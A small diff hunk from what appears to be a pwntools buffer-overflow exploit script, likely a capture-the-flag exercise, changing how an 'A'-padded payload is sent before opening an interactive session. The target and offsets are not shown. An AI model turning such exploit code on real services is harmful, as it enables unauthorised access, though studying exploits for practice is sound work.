@@ -73,6 +73,6 @@ buffer2 += "A" * length
 
 payload = buffer + buffer2
 
-p.send(payload) 
+p.sendline(payload) 
 p.interactive()
 
